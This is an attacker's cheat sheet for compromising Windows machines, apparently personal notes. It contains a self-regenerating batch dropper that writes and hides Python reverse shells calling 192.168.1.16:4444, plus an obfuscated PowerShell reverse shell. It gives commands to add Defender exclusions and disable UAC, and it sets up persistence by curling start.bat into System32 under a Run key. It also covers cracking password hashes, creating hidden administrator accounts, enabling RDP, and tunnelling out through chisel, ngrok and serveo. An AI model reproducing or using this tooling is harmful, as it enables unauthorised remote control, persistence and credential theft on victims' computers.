start.bat --> in case regenerating nihbtdtdow.bat
--------------------------------------------------------------------------------------------------------------
@echo off
cd %temp%
echo @echo off > nihbtdtdow.bat
echo cd %temp% >> nihbtdtdow.bat
echo :loop >> nihbtdtdow.bat
echo echo @echo off ^> pro1.bat^ >> nihbtdtdow.bat
echo echo del vb1.bat^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo :loop^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo if not exist "%%temp%%\sh1.py" ^^^(^ ^>^> pro1.bat^ >>nihbtdtdow.bat
echo echo     ^^(^ ^>^> pro1.bat^  >> nihbtdtdow.bat
echo echo            echo import socket^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import os^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import threading^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import subprocess as sp^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo import time^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo def rev^^^^(^^^^): ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    s = socket.socket^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    try^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        s.connect^^^^(^^^^('192.168.1.16', 4444^^^^)^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    except ConnectionRefusedError as e^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        print^^^^('refused ... Check if listener is running.'^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        return ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo.^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    def s_o^^^^(^^^^): ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                output = os.read^^^^(p.stdout.fileno^^^^(^^^^), 1024^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                if not output^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                s.sendall^^^^(output^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error sending output:", e^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    def r_i^^^^(^^^^): ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                data = s.recv^^^^(1024^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                if not data^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.write^^^^(data^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.flush^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error receiving input:", e^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=s_o, daemon=True^^^^).start^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=r_i, daemon=True^^^^).start^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    time.sleep^^^^(30^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo while True^^^^: ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    rev^^^^(^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo            echo    print^^^^("Loading ..."^^^^) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo        ) ^^^> %%temp%%\sh1.py^^ ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    ) else ^( ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    python %%temp%%\sh1.py ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro1.bat^ >> nihbtdtdow.bat
echo echo    ) ^>^> pro1.bat^ >> nihbtdtdow.bat
echo echo    goto loop ^>^> pro1.bat^ >> nihbtdtdow.bat
echo powershell -c "Start-Process -FilePath "%%temp%%\pro1.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
echo echo @echo off ^> pro.bat^ >> nihbtdtdow.bat
echo echo del vb1.bat^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo :loop^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo if not exist "%%temp%%\sh.py" ^^^(^ ^>^> pro.bat^ >>nihbtdtdow.bat
echo echo     ^^(^ ^>^> pro.bat^  >> nihbtdtdow.bat
echo echo            echo import socket^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import os^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import threading^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import subprocess as sp^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo import time^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo def rev^^^^(^^^^): ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    s = socket.socket^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    try^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        s.connect^^^^(^^^^('192.168.1.16', 4444^^^^)^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    except ConnectionRefusedError as e^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        print^^^^('refused ... Check if listener is running.'^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        return ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo.^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    def s_o^^^^(^^^^): ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                output = os.read^^^^(p.stdout.fileno^^^^(^^^^), 1024^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                if not output^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                s.sendall^^^^(output^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error sending output:", e^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    def r_i^^^^(^^^^): ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo        while True^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            try^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                data = s.recv^^^^(1024^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                if not data^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                    break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.write^^^^(data^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                p.stdin.flush^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo            except Exception as e^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                print^^^^("Error receiving input:", e^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo                break ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=s_o, daemon=True^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    threading.Thread^^^^(target=r_i, daemon=True^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    time.sleep^^^^(30^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo. ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo while True^^^^: ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    rev^^^^(^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo            echo    print^^^^("Loading ..."^^^^) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo        ) ^^^> %%temp%%\sh.py^^ ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    ) else ^( ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    python %%temp%%\sh.py ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro.bat^ >> nihbtdtdow.bat
echo echo    ) ^>^> pro.bat^ >> nihbtdtdow.bat
echo echo    goto loop ^>^> pro.bat^ >> nihbtdtdow.bat
echo powershell -c "Start-Process -FilePath "%%temp%%\pro.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
echo timeout ^/t 900 ^/nobreak ^>nul >> nihbtdtdow.bat
echo goto loop  >> nihbtdtdow.bat
powershell -c "Start-Process -FilePath "%temp%\nihbtdtdow.bat" -WindowStyle Hidden"
---------------------------------------------------------------------------------------------------------------
With Administrator Privs
powershell Set-MpPreference -ExclusionPath <path> 
to verify it was excluded :
powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
---------------------------------------------------------------------------------------------------------------
With Administrator Privs
To disable UAC :
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
TO verify it's disabled :
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
To enable it again :
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
---------------------------------------------------------------------------------------------------------------
Checking Administrator Privs in run.bat
CLS
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" && (
    echo .
) || (
    echo Access denied Run as administrator
    pause
    exit /b 1
)
---------------------------------------------------------------------------------------------------------------
To embed .manifest in .exe to make it runs as administrator :
with Resource Hacker :
<?xml version="1.0" encoding="UTF-8"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
---------------------------------------------------------------------------------------------------------------
obfuscated powershell 
$C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
---------------------------------------------------------------------------------------------------------------
install python on the target with administrator privs :
after transfering python32.exe or python64.exe based on the arch of the system 
.\python.exe /quiet InstallAllUsers=1 PrependPath=1
---------------------------------------------------------------------------------------------------------------
With Administrator Privs
backdoor runs after BIOS : 
cd C:\Windows\system32
curl https://raw.githubusercontent.com/0x2034/shell/main/start.bat -o start.bat
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /t REG_SZ /d "%SystemRoot%\System32\start.bat" /f
to verify it's added : 
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start"
to delete it :
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /f
---------------------------------------------------------------------------------------------------------------
In meterpreter with administrator privs to enable RDP :
1 - cracking current users's hash --> john <hash> --wordlist=/usr/share/wordlists/rockyou.txt --format=NT | hashcat <hash> -m 1000 /usr/share/wordlist/rockyou.txt
or creating a Hidden user :
    net user <os> <123> /add /active:no
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
    net user <os> /active:yes
    net localgroup Administrators <os> /add
    net localgroup "Remote Desktop Users" <os> /add
    icacls "C:\Users\<Administrator>" /grant <os>:(OI)(CI)RX
2 - use post/windows/manage/enable_rdp
3 - set session <id>
4 - run 
5 - from new terminal --> xfreerdp /u:<user> /v:<ip> /p:<password> 
In a shell with administrator privs to enable RDP :
1 - cracking current users's hash --> john <hash> --wordlist=/usr/share/wordlists/rockyou.txt --format=NT | hashcat <hash> -m 1000 /usr/share/wordlist/rockyou.txt
or creating a Hidden user :
    net user <os> <123> /add /active:no
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
    net user <os> /active:yes
    net localgroup Administrators <os> /add
    net localgroup "Remote Desktop Users" os /add
    icacls "C:\Users\<Administrator>" /grant <os>:(OI)(CI)RX
2 - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
3 - netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
4 - to verify it's enabled if the value = 0 --> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
5 - from new terminal --> xfreerdp /u:<user> /v:<ip> /p:<password> 
To Disable the RDP with administrator privs:
1 - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
2 - netsh advfirewall firewall set rule group="remote desktop" new enable=No
---------------------------------------------------------------------------------------------------------------
RDP externally after enable it on the target:
sudo nano /etc/proxychains4.conf
dynamic_chain 
socks5 127.0.0.1 1080
on victim's machine chisel.exe client <ip>:<port> R:socks
from new terminal --> chisel server -p <forwarded port 4444> --reverse
proxychains4 xfreerdp /u:<user> /v:<local ip> /p:<password>
or Using SSH :
ssh -R 127.0.0.1:<22>:<192.168.1.5>:<3389> <os>@<7.tcp.eu.ngrok.io> -p <11750>
from new terminal --> xfreerdp /v:localhost:<22> /u:<> /p:<>
---------------------------------------------------------------------------------------------------------------
Transfer file using curl externally :
proxychains4 python file_upload_server.py <forwarded port 4444>
curl -F "files=@<os.exe>" http://<4.tcp.eu.ngrok.io>:<15881>
---------------------------------------------------------------------------------------------------------------
To gain a temporarily public webserver using serveo.net and ssh :
1- sudo service apache2 start
2- ssh -R 80:192.168.1.16:80 serveo.net
---------------------------------------------------------------------------------------------------------------



